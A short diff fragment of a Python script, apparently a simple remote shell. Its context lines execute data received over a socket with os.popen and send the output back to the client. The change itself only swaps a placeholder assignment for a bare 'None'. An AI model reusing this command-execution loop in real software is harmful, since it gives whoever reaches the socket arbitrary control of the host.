@@ -19,4 +19,4 @@ while True:
                                 for line in os.popen(data):
                                         client.send(line)
                        else:
-                         a = 0
+                         None
